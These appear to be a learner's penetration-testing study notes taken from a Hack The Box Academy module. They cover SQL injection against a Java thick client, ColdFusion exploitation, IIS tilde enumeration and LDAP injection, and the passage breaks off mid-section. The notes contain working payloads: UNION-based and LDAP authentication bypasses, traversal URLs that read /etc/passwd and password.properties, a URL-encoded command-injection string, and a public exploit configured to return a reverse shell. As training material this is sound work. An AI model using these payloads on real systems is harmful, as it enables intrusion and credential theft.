		      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
		      <SNIP>
		        if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
		          return newUser; 
		        throw new LoginException("Wrong Password!");
		      <SNIP>
		           this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
		      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
		      return null;

	> Let's check how the client application sends credentials to the server. The login button creates the new object ClientGuiTest.this.user for the User class. It then calls the setUsername() and setPassword() functions with the respective username and password values. The values that are returned from these functions are then sent to the server.

	> Let's check the setUsername() and setPassword() functions from htb/fatty/client/shared/resources/user.java.
		Code: java

		public void setUsername(String username) {
		    this.username = username;
		  }

		  public void setPassword(String password) {
		    String hashString = this.username + password + "clarabibimakeseverythingsecure";
		    MessageDigest digest = null;
		    try {
		      digest = MessageDigest.getInstance("SHA-256");
		    } catch (NoSuchAlgorithmException e) {
		      e.printStackTrace();
		    } 
		    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));
		    this.password = DatatypeConverter.printHexBinary(hash);
		  }

	> The username is accepted without modification, but the password is changed to the format below.
		Code: java
		sha256(username+password+"clarabibimakeseverythingsecure")

	> We also notice that the username isn't sanitized and is directly used in the SQL query, making it vulnerable to SQL injection.
		Code: java
		rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");

	> The checkLogin function in htb/fatty/server/database/FattyDbSession.class writes the SQL exception to a log file.
		Code: java
		<SNIP>
		    this.logger.logError("[-] Failure with SQL query: ==> SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "' <==");
		      this.logger.logError("[-] Exception was: '" + e.getMessage() + "'");
		<SNIP>

	> Login into the application using the username qtc' to validate the SQL injection vulnerability reveals a syntax error. To see the error, we need to edit the code in the fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java file as follows.
		Code: java
		ClientGuiTest.this.currentFolder = "../logs";
		  try {
		    response = ClientGuiTest.this.invoker.showFiles("../logs");

	> Listing the content of the error-log.txt file reveals the following message. => (https://academy.hackthebox.com/storage/modules/113/thick_clients_web/error.png)

	> This confirms that the username field is vulnerable to SQL Injection. However, login attempts using payloads such as ' or '1'='1 in both fields fail. Assuming that the username in the login form is ' or '1'='1, the server will process the username as below.
		Code: sql
		SELECT id,username,email,password,role FROM users WHERE username='' or '1'='1'

	> The above query succeeds and returns the first record in the database. The server then creates a new user object with the obtained results.
		Code: java

		<SNIP>
		if (rs.next()) {
		        int id = rs.getInt("id");
		        String username = rs.getString("username");
		        String email = rs.getString("email");
		        String password = rs.getString("password");
		        String role = rs.getString("role");
		        newUser = new User(id, username, password, email, Role.getRoleByName(role), false);
		<SNIP>

	> It then compares the newly created user password with the user-supplied password.
		Code: java
		<SNIP>
		if (newUser.getPassword().equalsIgnoreCase(user.getPassword()))
		    return newUser;
		throw new LoginException("Wrong Password!");
		<SNIP>

	> Then, the following value is produced by newUser.getPassword() function.
		Code: java
		sha256("qtc"+"clarabibi"+"clarabibimakeseverythingsecure") = 5a67ea356b858a2318017f948ba505fd867ae151d6623ec32be86e9c688bf046

	> The user-supplied password hash user.getPassword() is calculated as follows.
		Code: java
		sha256("' or '1'='1" + "' or '1'='1" + "clarabibimakeseverythingsecure") = cc421e01342afabdd4857e7a1db61d43010951c7d5269e075a029f5d192ee1c8

	> Although the hash sent to the server by the client doesn't match the one in the database, and the password comparison fails, the SQL injection is still possible using UNION queries. Let's consider the following example.
		Code: sql
		MariaDB [userdb]> select * from users where username='john';
		+----------+-------------+
		| username | password    |
		+----------+-------------+
		| john     | password123 |
		+----------+-------------+

	> It is possible to create fake entries using the SELECT operator. Let's input an invalid username to create a new user entry.
		Code: sql
		MariaDB [userdb]> select * from users where username='test' union select 'admin', 'welcome123';
		+----------+-------------+
		| username | password    |
		+----------+-------------+
		| admin    | welcome123  |
		+----------+-------------+

	> Similarly, the injection in the username field can be leveraged to create a fake user entry.
		Code: java
		test' UNION SELECT 1,'invaliduser','invalid@a.b','invalidpass','admin

	> This way, the password, and the assigned role can be controlled. The following snippet of code sends the plaintext password entered in the form. Let's modify the code in htb/fatty/shared/resources/User.java to submit the password as it is from the client application.
		Code: java
		public User(int uid, String username, String password, String email, Role role) {
		    this.uid = uid;
		    this.username = username;
		    this.password = password;
		    this.email = email;
		    this.role = role;
		}
		public void setPassword(String password) {
		    this.password = password;
		  }

	> We can now rebuild the JAR file and attempt to log in using the payload abc' UNION SELECT 1,'abc','a@b.com','abc','admin in the username field and the random text abc in the password field. 
	> The server will eventually process the following query.
		Code: sql
		select id,username,email,password,role from users where username='abc' UNION SELECT 1,'abc','a@b.com','abc','admin'

	> The first select query fails, while the second returns valid user results with the role admin and the password abc. The password sent to the server is also abc, which results in a successful password comparison, and the application allows us to log in as the user admin.

-=-=-=
[+] ColdFusion - Discovery & Enumeration
	> ColdFusion is a programming language and a web application development platform based on Java. ColdFusion was initially developed by the Allaire Corporation in 1995 and was acquired by Macromedia in 2001. Macromedia was later acquired by Adobe Systems, which now owns and develops ColdFusion.
	> It is used to build dynamic and interactive web applications that can be connected to various APIs and databases such as MySQL, Oracle, and Microsoft SQL Server. ColdFusion was first released in 1995 and has since evolved into a powerful and versatile platform for web development.
	> ColdFusion Markup Language (CFML) is the proprietary programming language used in ColdFusion to develop dynamic web applications. It has a syntax similar to HTML, making it easy to learn for web developers. CFML includes tags and functions for database integration, web services, email management, and other common web development tasks. Its tag-based approach simplifies application development by reducing the amount of code needed to accomplish complex tasks. For instance, the cfquery tag can execute SQL statements to retrieve data from a database:
		Code: html

		<cfquery name="myQuery" datasource="myDataSource">
		  SELECT *
		  FROM myTable
		</cfquery>

	> Developers can then use the cfloop tag to iterate through the records retrieved from the database:
		Code: html

		<cfloop query="myQuery">
		  <p>#myQuery.firstName# #myQuery.lastName#</p>
		</cfloop>

	> Thanks to its built-in functions and features, CFML enables developers to create complex business logic using minimal code. Moreover, ColdFusion supports other programming languages, such as JavaScript and Java, allowing developers to use their preferred programming language within the ColdFusion environment.
	
	> ColdFusion also offers support for email, PDF manipulation, graphing, and other commonly used features. The applications developed using ColdFusion can run on any server that supports its runtime. It is available for download from Adobe's website and can be installed on Windows, Mac, or Linux operating systems. ColdFusion applications can also be deployed on cloud platforms like Amazon Web Services or Microsoft Azure. Some of the primary purposes and benefits of ColdFusion include:
	> Benefits 	Description
		- Developing data-driven web applications 	ColdFusion allows developers to build rich, responsive web applications easily. It offers session management, form handling, debugging, and more features. ColdFusion allows you to leverage your existing knowledge of the language and combines it with advanced features to help you build robust web applications quickly.
		- Integrating with databases 	ColdFusion easily integrates with databases such as Oracle, SQL Server, and MySQL. ColdFusion provides advanced database connectivity and is designed to make it easy to retrieve, manipulate, and view data from a database and the web.
		- Simplifying web content management 	One of the primary goals of ColdFusion is to streamline web content management. The platform offers dynamic HTML generation and simplifies form creation, URL rewriting, file uploading, and handling of large forms. Furthermore, ColdFusion also supports AJAX by automatically handling the serialisation and deserialisation of AJAX-enabled components.
		- Performance 	ColdFusion is designed to be highly performant and is optimised for low latency and high throughput. It can handle a large number of simultaneous requests while maintaining a high level of performance.
		- Collaboration 	ColdFusion offers features that allow developers to work together on projects in real-time. This includes code sharing, debugging, version control, and more. This allows for faster and more efficient development, reduced time-to-market and quicker delivery of projects.

	> Despite being less popular than other web development platforms, ColdFusion is still widely used by developers and organisations globally. Thanks to its ease of use, rapid application development capabilities, and integration with other web technologies, it is an ideal choice for building web applications quickly and efficiently. ColdFusion has evolved, with new versions periodically released since its inception.
	> The latest stable version of ColdFusion, as of this writing, is ColdFusion 2021, with ColdFusion 2023 about to enter Alpha. Earlier versions include ColdFusion 2018, ColdFusion 2016, and ColdFusion 11, each with new features and improvements such as better performance, more straightforward integration with other platforms, improved security, and enhanced usability.
	> Like any web-facing technology, ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. To improve the security of ColdFusion, developers must implement secure coding practices, input validation checks, and properly configure web servers and firewalls. Here are a few known vulnerabilities of ColdFusion:
    	- CVE-2021-21087: Arbitrary disallow of uploading JSP source code
    	- CVE-2020-24453: Active Directory integration misconfiguration
    	- CVE-2020-24450: Command injection vulnerability
    	- CVE-2020-24449: Arbitrary file reading vulnerability
    	- CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

	> ColdFusion exposes a fair few ports by default. It's important to note that default ports can be changed during installation or configuration.
		- Port Number 	Protocol 	Description
		- 80 	HTTP 	Used for non-secure HTTP communication between the web server and web browser.
		- 443 	HTTPS 	Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.
		- 1935 	RPC 	Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device.
		- 25 	SMTP 	Simple Mail Transfer Protocol (SMTP) is used for sending email messages.
		- 8500 	SSL 	Used for server communication via Secure Socket Layer (SSL).
		- 5500 	Server Monitor 	Used for remote administration of the ColdFusion server.

* Enumeration
	> During a penetration testing enumeration, several ways exist to identify whether a web application uses ColdFusion. Here are some methods that can be used:
	> Method 	Description
		- Port Scanning 	ColdFusion typically uses port 80 for HTTP and port 443 for HTTPS by default. So, scanning for these ports may indicate the presence of a ColdFusion server. Nmap might be able to identify ColdFusion during a services scan specifically.
		- File Extensions 	ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.
		- HTTP Headers 	Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.
		- Error Messages 	If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.
		- Default Files 	ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion.

	> NMap ports and service scan results
		m1l0js@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open
		PORT      STATE SERVICE
		135/tcp   open  msrpc
		8500/tcp  open  fmtp
		49154/tcp open  unknown

	> The port scan results show three open ports. Two Windows RPC services, and one running on 8500. As we know, 8500 is a default port that ColdFusion uses for SSL. Navigating to the IP:8500 lists 2 directories, CFIDE and cfdocs, in the root, further indicating that ColdFusion is running on port 8500.
	> Navigating around the structure a bit shows lots of interesting info, from files with a clear .cfm extension to error messages and login pages.
	> The /CFIDE/administrator path, however, loads the ColdFusion 8 Administrator login page. Now we know for certain that ColdFusion 8 is running on the server.

-=-=-
[+] Attacking ColdFusion
	> Now that we know that ColdFusion 8 is a target, the next step is to check for existing known exploits. Searchsploit is a command-line tool for searching and finding exploits in the Exploit Database. It is part of the Exploit Database project, a non-profit organisation providing a public repository of exploits and vulnerable software. Searchsploit searches through the Exploit Database and returns a list of exploits and their relevant details, including the name of the exploit, its description, and the date it was released.
		m1l0js@htb[/htb]$ searchsploit adobe coldfusion
		
	> As we know, the version of ColdFusion running is ColdFusion 8, and there are two results of interest. The Adobe ColdFusion - Directory Traversal and the Adobe ColdFusion 8 - Remote Command Execution (RCE) results.

* Directory Traversal
	> Directory/Path Traversal is an attack that allows an attacker to access files and directories outside of the intended directory in a web application. The attack exploits the lack of input validation in a web application and can be executed through various input fields such as URL parameters, form fields, cookies, and more. By manipulating input parameters, the attacker can traverse the directory structure of the web application and access sensitive files, including configuration files, user data, and other system files. The attack can be executed by manipulating the input parameters in ColdFusion tags such as CFFile and CFDIRECTORY, which are used for file and directory operations such as uploading, downloading, and listing files.
	> Take the following ColdFusion code snippet:
		Code: html

		<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
		<cfloop query="fileList">
		    <a href="uploads/#fileList.name#">#fileList.name#</a><br>
		</cfloop>

	> In this code snippet, the ColdFusion cfdirectory tag lists the contents of the uploads directory, and the cfloop tag is used to loop through the query results and display the filenames as clickable links in HTML.
	> However, the directory parameter is not validated correctly, which makes the application vulnerable to a Path Traversal attack. An attacker can exploit this vulnerability by manipulating the directory parameter to access files outside the uploads directory.
		Code: http
		http://example.com/index.cfm?directory=../../../etc/&file=passwd

	> In this example, the ../ sequenceis used to navigate the directory tree and access the /etc/passwd file outside the intended location.
	> CVE-2010-2861 is the Adobe ColdFusion - Directory Traversal exploit discovered by searchsploit. It is a vulnerability in ColdFusion that allows attackers to conduct path traversal attacks.
    	- CFIDE/administrator/settings/mappings.cfm
    	- logging/settings.cfm
    	- datasources/index.cfm
    	- j2eepackaging/editarchive.cfm
    	- CFIDE/administrator/enter.cfm

	> These ColdFusion files are vulnerable to a directory traversal attack in Adobe ColdFusion 9.0.1 and earlier versions. Remote attackers can exploit this vulnerability to read arbitrary files by manipulating the locale parameter in these specific ColdFusion files.
	> With this vulnerability, attackers can access files outside the intended directory by including ../ sequences in the file parameter. For example, consider the following URL:
		Code: http
		http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=en

	> In this example, the URL attempts to access the mappings.cfm file in the /CFIDE/administrator/settings/ directory of the web application with a specified en locale. However, a directory traversal attack can be executed by manipulating the URL's locale parameter, allowing an attacker to read arbitrary files located outside of the intended directory, such as configuration files or system files.
		Code: http
		http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd

	> In this example, the ../ sequences have been used to replace a valid locale to traverse the directory structure and access the passwd file located in the /etc/ directory.
	> Using searchsploit, copy the exploit to a working directory and then execute the file to see what arguments it requires.
		m1l0js@htb[/htb]$ searchsploit -p 14641

* Coldfusion - Exploitation
		m1l0js@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
		m1l0js@htb[/htb]$ python2 14641.py 

			usage: 14641.py <host> <port> <file_path>
			example: 14641.py localhost 80 ../../../../../../../lib/password.properties
			if successful, the file will be printed

	> The password.properties file in ColdFusion is a configuration file that securely stores encrypted passwords for various services and resources the ColdFusion server uses. It contains a list of key-value pairs, where the key represents the resource name and the value is the encrypted password. These encrypted passwords are used for services like database connections, mail servers, LDAP servers, and other resources that require authentication. By storing encrypted passwords in this file, ColdFusion can automatically retrieve and use them to authenticate with the respective services without requiring the manual entry of passwords each time. The file is usually in the [cf_root]/lib directory and can be managed through the ColdFusion Administrator.
	> By providing the correct parameters to the exploit script and specifying the path of the desired file, the script can trigger an exploit on the vulnerable endpoints mentioned above. The script will then output the result of the exploit attempt:

		m1l0js@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"

	> As we can see, the contents of the password.properties file have been retrieved, proving that this target is vulnerable to CVE-2010-2861.

* Unauthenticated RCE

	> Unauthenticated Remote Code Execution (RCE) is a type of security vulnerability that allows an attacker to execute arbitrary code on a vulnerable system without requiring authentication. This type of vulnerability can have severe consequences, as it will enable an attacker to take complete control of the system and potentially steal sensitive data or cause damage to the system.
	> The difference between a RCE and an Unauthenticated Remote Code Execution is whether or not an attacker needs to provide valid authentication credentials in order to exploit the vulnerability. An RCE vulnerability allows an attacker to execute arbitrary code on a target system, regardless of whether or not they have valid credentials. However, in many cases, RCE vulnerabilities require that the attacker already has access to some part of the system, either through a user account or other means.
	> In contrast, an unauthenticated RCE vulnerability allows an attacker to execute arbitrary code on a target system without any valid authentication credentials. This makes this type of vulnerability particularly dangerous, as an attacker can potentially take over a system or execute malicious commands without any barrier to entry.
	
	> In the context of ColdFusion web applications, an Unauthenticated RCE attack occurs when an attacker can execute arbitrary code on the server without requiring any authentication. This can happen when a web application allows the execution of arbitrary code through a feature or function that does not require authentication, such as a debugging console or a file upload functionality. Take the following code:
		Code: html
		<cfset cmd = "#cgi.query_string#">
		<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">

	> In the above code, the cmd variable is created by concatenating the cgi.query_string variable with a command to be executed. This command is then executed using the cfexecute function, which runs the Windows cmd.exe program with the specified arguments. This code is vulnerable to an unauthenticated RCE attack because it does not properly validate the cmd variable before executing it, nor does it require the user to be authenticated. An attacker could simply pass a malicious command as the cgi.query_string variable, and it would be executed by the server.
		Code: http
		# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

		http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt

	> This URL includes a semicolon (%3B) at the beginning of the query string, which can allow for the execution of multiple commands on the server. This could potentially append legitimate functionality with an unintended command. The included echo command prints a message to the console, and is followed by a redirection command to write a file to the C: directory with a message indicating that the server has been compromised.
	> An example of a ColdFusion Unauthenticated RCE attack is the CVE-2009-2265 vulnerability that affected Adobe ColdFusion versions 8.0.1 and earlier. This exploit allowed unauthenticated users to upload files and gain remote code execution on the target host. The vulnerability exists in the FCKeditor package, and is accessible on the following path:
		Code: http
		http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=

	> CVE-2009-2265 is the vulnerability identified by our earlier searchsploit search as Adobe ColdFusion 8 - Remote Command Execution (RCE). Pull it into a working directory.
		m1l0js@htb[/htb]$ searchsploit -p 50057

	> A quick cat review of the code indicates that the script needs some information. Set the correct information and launch the exploit.
	> Exploit Modification
		Code: python
		if __name__ == '__main__':
		    # Define some information
		    lhost = '10.10.14.55' # HTB VPN IP
		    lport = 4444 # A port not in use on localhost
		    rhost = "10.129.247.30" # Target IP
		    rport = 8500 # Target Port
		    filename = uuid.uuid4().hex

	> The exploit will take a bit of time to launch, but it eventually will return a functional remote shell
		m1l0js@htb[/htb]$ python3 50057.py 

-=-=-=
[+] IIS Tilde Enumeration

	> IIS tilde directory enumeration is a technique utilised to uncover hidden files, directories, and short file names (aka the 8.3 format) on some versions of Microsoft Internet Information Services (IIS) web servers. This method takes advantage of a specific vulnerability in IIS, resulting from how it manages short file names within its directories.
	> When a file or folder is created on an IIS server, Windows generates a short file name in the 8.3 format, consisting of eight characters for the file name, a period, and three characters for the extension. Intriguingly, these short file names can grant access to their corresponding files and folders, even if they were meant to be hidden or inaccessible.
	> The tilde (~) character, followed by a sequence number, signifies a short file name in a URL. Hence, if someone determines a file or folder's short file name, they can exploit the tilde character and the short file name in the URL to access sensitive data or hidden resources.
	> IIS tilde directory enumeration primarily involves sending HTTP requests to the server with distinct character combinations in the URL to identify valid short file names. Once a valid short file name is detected, this information can be utilised to access the relevant resource or further enumerate the directory structure.
	> The enumeration process starts by sending requests with various characters following the tilde:
		Code: http
		http://example.com/~a
		http://example.com/~b
		http://example.com/~c
		...

	> Assume the server contains a hidden directory named SecretDocuments. When a request is sent to http://example.com/~s, the server replies with a 200 OK status code, revealing a directory with a short name beginning with "s". The enumeration process continues by appending more characters:
		Code: http
		http://example.com/~se
		http://example.com/~sf
		http://example.com/~sg
		...

	> For the request http://example.com/~se, the server returns a 200 OK status code, further refining the short name to "se". Further requests are sent, such as:
		Code: http
		http://example.com/~sec
		http://example.com/~sed
		http://example.com/~see
		...

	> The server delivers a 200 OK status code for the request http://example.com/~sec, further narrowing the short name to "sec".
	> Continuing this procedure, the short name secre~1 is eventually discovered when the server returns a 200 OK status code for the request http://example.com/~secre.
	> Once the short name secre~1 is identified, enumeration of specific file names within that path can be performed, potentially exposing sensitive documents.
	> For instance, if the short name secre~1 is determined for the concealed directory SecretDocuments, files in that directory can be accessed by submitting requests such as:
		Code: http
		http://example.com/secre~1/somefile.txt
		http://example.com/secre~1/anotherfile.docx

	> The same IIS tilde directory enumeration technique can also detect 8.3 short file names for files within the directory. After obtaining the short names, those files can be directly accessed using the short names in the requests.
		Code: http
		http://example.com/secre~1/somefi~1.txt

	> In 8.3 short file names, such as somefi~1.txt, the number "1" is a unique identifier that distinguishes files with similar names within the same directory. The numbers following the tilde (~) assist the file system in differentiating between files that share similarities in their names, ensuring each file has a distinct 8.3 short file name.
	> For example, if two files named somefile.txt and somefile1.txt exist in the same directory, their 8.3 short file names would be:

    	- somefi~1.txt for somefile.txt
    	- somefi~2.txt for somefile1.txt

* Enumeration
	> The initial phase involves mapping the target and determining which services are operating on their respective ports.
	> Nmap - Open ports
		m1l0js@htb[/htb]$ nmap -p- -sV -sC --open 10.129.224.91

	> IIS 7.5 is running on port 80. Executing a tilde enumeration attack on this version could be a viable option.

* Tilde Enumeration using IIS ShortName Scanner
	> Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called IIS-ShortName-Scanner that can automate this task. You can find it on GitHub at the following link: IIS-ShortName-Scanner(https://github.com/irsdl/IIS-ShortName-Scanner). To use IIS-ShortName-Scanner, you will need to install Oracle Java on either Pwnbox or your local VM. Details can be found in the following link. How to Install Oracle Java(https://ubuntuhandbook.org/index.php/2022/03/install-jdk-18-ubuntu/)
	> When you run the below command, it will prompt you for a proxy, just hit enter for No.
		m1l0js@htb[/htb]$ java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

		Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
		Do you want to use proxy [Y=Yes, Anything Else=No]? 
		# IIS Short Name (8.3) Scanner version 2023.0 - scan initiated 2023/03/23 15:06:57
		Target: http://10.129.204.231/
		|_ Result: Vulnerable!
		|_ Used HTTP method: OPTIONS
		|_ Suffix (magic part): /~1/
		|_ Extra information:
		  |_ Number of sent requests: 553
		  |_ Identified directories: 2
		    |_ ASPNET~1
		    |_ UPLOAD~1
		  |_ Identified files: 3
		    |_ CSASPX~1.CS
		      |_ Actual extension = .CS
		    |_ CSASPX~1.CS??
		    |_ TRANSF~1.ASP

	> Upon executing the tool, it discovers 2 directories and 3 files. However, the target does not permit GET access to http://10.129.204.231/TRANSF~1.ASP, necessitating the brute-forcing of the remaining filename.

* Generate Wordlist
		m1l0js@htb[/htb]$ egrep -r ^transf /usr/share/wordlists/ | sed 's/^[^:]*://' > /tmp/list.txt

	> This command combines egrep and sed to filter and modify the contents of input files, then save the results to a new file.
	> Command Part 	Description
		- egrep -r ^transf 	The egrep command is used to search for lines containing a specific pattern in the input files. The -r flag indicates a recursive search through directories. The ^transf pattern matches any line that starts with "transf". The output of this command will be lines that begin with "transf" along with their source file names.
		- | 	The pipe symbol (|) is used to pass the output of the first command (egrep) to the second command (sed). In this case, the lines starting with "transf" and their file names will be the input for the sed command.
		- sed 's/^[^:]*://' 	The sed command is used to perform a find-and-replace operation on its input (in this case, the output of egrep). The 's/^[^:]*://' expression tells sed to find any sequence of characters at the beginning of a line (^) up to the first colon (:), and replace them with nothing (effectively removing the matched text). The result will be the lines starting with "transf" but without the file names and colons.
		- > /tmp/list.txt 	The greater-than symbol (>) is used to redirect the output of the entire command (i.e., the modified lines) to a new file named /tmp/list.txt.

* Gobuster Enumeration
	> Once you have created the custom wordlist, you can use gobuster to enumerate all items in the target. GoBuster is an open-source directory and file brute-forcing tool written in the Go programming language. It is designed for penetration testers and security professionals to help identify and discover hidden files, directories, or resources on web servers during security assessments.
		m1l0js@htb[/htb]$ gobuster dir -u http://10.129.204.231/ -w /tmp/list.txt -x .aspx,.asp

-=-=-=

[+] LDAP

	> LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information. A directory is a hierarchical data store that contains information about network resources such as users, groups, computers, printers, and other devices. LDAP provides some excellent functionality:
	> Functionality 	Description
		- Efficient 	Efficient and fast queries and connections to directory services, thanks to its lean query language and non-normalised data storage.
		- Global naming model 	Supports multiple independent directories with a global naming model that ensures unique entries.
		- Extensible and flexible 	This helps to meet future and local requirements by allowing custom attributes and schemas.
		- Compatibility 	It is compatible with many software products and platforms as it runs over TCP/IP and SSL directly, and it is platform-independent, suitable for use in heterogeneous environments with various operating systems.
		- Authentication 	It provides authentication mechanisms that enable users to sign on once and access multiple resources on the server securely.

	> However, it also suffers some significant issues:
	> Functionality 	Description
		- Compliance 	Directory servers must be LDAP compliant for service to be deployed, which may limit the choice of vendors and products.
		- Complexity 	Difficult to use and understand for many developers and administrators, who may not know how to configure LDAP clients correctly or use it securely.
		- Encryption 	LDAP does not encrypt its traffic by default, which exposes sensitive data to potential eavesdropping and tampering. LDAPS (LDAP over SSL) or StartTLS must be used to enable encryption.
		- Injection 	Vulnerable to LDAP injection attacks, where malicious users can manipulate LDAP queries and gain unauthorised access to data or resources. To prevent such attacks, input validation and output encoding must be implemented.

	> LDAP is commonly used for providing a central location for accessing and managing directory services. Directory services are collections of information about the organisation, its users, and assets–like usernames and passwords. LDAP enables organisations to store, manage, and secure this information in a standardised way. Here are some common use cases:
	> Use Case 	Description
		- Authentication 	LDAP can be used for central authentication, allowing users to have single login credentials across multiple applications and systems. This is one of the most common use cases for LDAP.
		- Authorisation 	LDAP can manage permissions and access control for network resources such as folders or files on a network share. However, this may require additional configuration or integration with protocols like Kerberos.
		- Directory Services 	LDAP provides a way to search, retrieve, and modify data stored in a directory, making it helpful for managing large numbers of users and devices in a corporate network. LDAP is based on the X.500 standard for directory services.
		- Synchronisation 	LDAP can be used to keep data consistent across multiple systems by replicating changes made in one directory to another.

	> There are two popular implementations of LDAP: OpenLDAP, an open-source software widely used and supported, and Microsoft Active Directory, a Windows-based implementation that seamlessly integrates with other Microsoft products and services.

	> Although LDAP and AD are related, they serve different purposes. LDAP is a protocol that specifies the method of accessing and modifying directory services, whereas AD is a directory service that stores and manages user and computer data. While LDAP can communicate with AD and other directory services, it is not a directory service itself. AD offers extra functionalities such as policy administration, single sign-on, and integration with various Microsoft products.
	> LDAP 	Active Directory (AD)
		- A protocol that defines how clients and servers communicate with each other to access and manipulate data stored in a directory service. 	
		- An open and cross-platform protocol that can be used with different types of directory servers and applications. 	
		- It has a flexible and extensible schema that allows custom attributes and object classes to be defined by administrators or developers. 	
		- Supports multiple authentication mechanisms such as simple bind, SASL, etc. 	

	> Active Directory(AD)
		- A directory server that uses LDAP as one of its protocols to provide authentication, authorisation, and other services for Windows-based networks.
		- Proprietary software that only works with Windows-based systems and requires additional components such as DNS (Domain Name System) and Kerberos for its functionality.
		- It has a predefined schema that follows and extends the X.500 standard with additional object classes and attributes specific to Windows environments. Modifications should be made with caution and care.
		- It supports Kerberos as its primary authentication mechanism but also supports NTLM (NT LAN Manager) and LDAP over SSL/TLS for backward compatibility.

	> LDAP works by using a client-server architecture. A client sends an LDAP request to a server, which searches the directory service and returns a response to the client. LDAP is a protocol that is simpler and more efficient than X.500, on which it is based. It uses a client-server model, where clients send requests to servers using LDAP messages encoded in ASN.1 (Abstract Syntax Notation One) and transmitted over TCP/IP (Transmission Control Protocol/Internet Protocol). The servers process the requests and send back responses using the same format. LDAP supports various requests, such as bind, unbind, search, compare, add, delete, modify, etc.
	
	> LDAP requests are messages that clients send to servers to perform operations on data stored in a directory service. An LDAP request is comprised of several components:

    	- Session connection: The client connects to the server via an LDAP port (usually 389 or 636).
    	- Request type: The client specifies the operation it wants to perform, such as bind, search, etc.
    	- Request parameters: The client provides additional information for the request, such as the distinguished name (DN) of the entry to be accessed or modified, the scope and filter of the search query, the attributes and values to be added or changed, etc.
    	- Request ID: The client assigns a unique identifier for each request to match it with the corresponding response from the server.

	> Once the server receives the request, it processes it and sends back a response message that includes several components:
    	- Response type: The server indicates the operation that was performed in response to the request.
    	- Result code: The server indicates whether or not the operation was successful and why.
    	- Matched DN: If applicable, the server returns the DN of the closest existing entry that matches the request.
    	- Referral: The server returns a URL of another server that may have more information about the request, if applicable.
    	- Response data: The server returns any additional data related to the response, such as the attributes and values of an entry that was searched or modified.

	> After receiving and processing the response, the client disconnects from the LDAP port.

	> For example, ldapsearch is a command-line utility used to search for information stored in a directory using the LDAP protocol. It is commonly used to query and retrieve data from an LDAP directory service.
ldapsearch
		m1l0js@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

	> This command can be broken down as follows:
    	- Connect to the server ldap.example.com on port 389.
    	- Bind (authenticate) as cn=admin,dc=example,dc=com with password secret123.
    	- Search under the base DN ou=people,dc=example,dc=com.
    	- Use the filter (mail=john.doe@example.com) to find entries that have this email address.

	> The server would process the request and send back a response, which might look something like this:
		Code: ldap
		
		dn: uid=jdoe,ou=people,dc=example,dc=com
		objectClass: inetOrgPerson
		objectClass: organizationalPerson
		objectClass: person
		objectClass: top
		cn: John Doe
		sn: Doe
		uid: jdoe
		mail: john.doe@example.com
		
		result: 0 Success

This response includes the entry's distinguished name (DN) that matches the search criteria and its attributes and values.
LDAP Injection

LDAP injection is an attack that exploits web applications that use LDAP (Lightweight Directory Access Protocol) for authentication or storing user information. The attacker can inject malicious code or characters into LDAP queries to alter the application's behaviour, bypass security measures, and access sensitive data stored in the LDAP directory.

To test for LDAP injection, you can use input values that contain special characters or operators that can change the query's meaning:
Input 	Description
* 	An asterisk * can match any number of characters.
( ) 	Parentheses ( ) can group expressions.
| 	A vertical bar | can perform logical OR.
& 	An ampersand & can perform logical AND.
(cn=*) 	Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. For example, (cn=*) or (objectClass=*) can be used as input values for a username or password fields.

LDAP injection attacks are similar to SQL injection attacks but target the LDAP directory service instead of a database.

For example, suppose an application uses the following LDAP query to authenticate users:
Code: php

(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

In this query, $username and $password contain the user's login credentials. An attacker could inject the * character into the $username or $password field to modify the LDAP query and bypass authentication.

If an attacker injects the * character into the $username field, the LDAP query will match any user account with any password. This would allow the attacker to gain access to the application with any password, as shown below:
Code: php

$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

Alternatively, if an attacker injects the * character into the $password field, the LDAP query would match any user account with any password that contains the injected string. This would allow the attacker to gain access to the application with any username, as shown below:
